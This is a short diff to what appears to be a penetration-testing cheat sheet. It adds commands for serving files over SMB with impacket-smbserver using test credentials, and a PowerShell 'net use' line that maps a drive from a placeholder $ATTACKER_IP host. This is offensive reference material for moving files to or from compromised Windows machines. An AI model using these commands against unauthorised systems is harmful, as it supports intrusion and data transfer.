@@ -124,3 +124,12 @@ Create/Spin SMB server
 #access on windows with \\$LOCAL_IP\s\$FILENAME
 impacket-smbserver -smb2support s .
 ```
+or if anonymous SMB access is disabled:
+
+```bash
+impacket-smbserver -smb2support -user test -password test test `pwd`
+```
+
+```powershell
+net use z: \\$ATTACKER_IP\test /user:test test
+```
